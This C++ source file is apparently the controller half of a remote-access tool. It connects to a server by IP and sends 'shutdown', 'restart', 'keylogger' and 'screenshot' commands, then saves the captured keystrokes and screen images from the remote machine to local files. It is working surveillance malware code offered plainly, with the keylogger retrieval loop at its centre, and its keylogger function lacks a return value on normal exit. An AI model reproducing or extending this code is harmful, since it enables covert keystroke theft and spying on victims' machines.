#include "client_socket.h"
#include <iostream>
#include <fstream>
#include <conio.h>


Client::Client(const std::string& serverIP, int port)
    : serverIP(serverIP), port(port), clientSocket(INVALID_SOCKET) {
    // Initialize Winsock
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        std::cerr << "WSAStartup failed: " << result << std::endl;
    }
}

Client::~Client() {
    // Cleanup
    if (clientSocket != INVALID_SOCKET) {
        closesocket(clientSocket);
    }
    WSACleanup();
}

bool Client::connectToServer() {
    // Create socket
    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Error at socket(): " << WSAGetLastError() << std::endl;
        WSACleanup();
        return false;
    }

    // Setup sockaddr_in structure
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(serverIP.c_str());
    serverAddr.sin_port = htons(port);

    // Connect to server
    int result = connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));
    if (result == SOCKET_ERROR) {
        std::cerr << "Unable to connect to server: " << WSAGetLastError() << std::endl;
        closesocket(clientSocket);
        return false;
    }

    return true;
}

bool Client::sendShutdownRequest() {
    const char* message = "shutdown";
    int result = send(clientSocket, message, strlen(message), 0);
    if (result == SOCKET_ERROR) {
        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
        return false;
    }
    std::cout << "Shutdown request sent successfully!" << std::endl;
    return true;
}

bool Client::sendRestartRequest() {
    const char* message = "restart";
    int result = send(clientSocket, message, strlen(message), 0);
    if (result == SOCKET_ERROR) {
        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
        return false;
    }
    std::cout << "Restart request sent successfully!" << std::endl;
    return true;
}

bool  Client::sendKeyloggerRequest(){
    const char* message = "keylogger";
    int result = send(clientSocket, message, strlen(message), 0);
    if (result == SOCKET_ERROR) {
        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
        return false;
    }
    
    char buffer[1024];
    std::ofstream outFile("keylogger_output.txt", std::ios::app);  // Open file in append mode

    if (!outFile) {
        std::cerr << "Error: Unable to open file for writing.\n";
        return false;
    }
    while(true){
        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
        if (bytesReceived > 0) {
            // Write the received data to the file
            std:: cout << std::string(buffer, 0, bytesReceived) << " ";
            outFile << std::string(buffer, 0, bytesReceived) << " ";
            outFile.flush();
        }
          if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) {
            std::cout << "Exiting KeyLogger...\n";
            break;
        }
        Sleep(10); 
    }
    outFile.close();
}
   
bool Client::sendScreenshotRequest()
{
    // Step 1: Send a request to the server for a screenshot
    const char* requestMessage = "screenshot";
    int sendResult = send(clientSocket, requestMessage, strlen(requestMessage), 0);
    if (sendResult == SOCKET_ERROR) {
        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
        return false;
    }

    // Step 2: Receive the screenshot data
    char buffer[1024]; // Adjust size as necessary
    std::ofstream outFile("received_screenshot.png", std::ios::binary);
    if (!outFile) {
        std::cerr << "Error opening file for writing." << std::endl;
        return false;
    }

    // Assume the server sends the size first
    int bytesReceived;
    while ((bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0)) > 0) {
        outFile.write(buffer, bytesReceived); // Write the received data to the file
    }

    if (bytesReceived < 0) {
        std::cerr << "Receive failed: " << WSAGetLastError() << std::endl;
        return false;
    }

    outFile.close();
    std::cout << "Screenshot received and saved as received_screenshot.png" << std::endl;
    return true;
}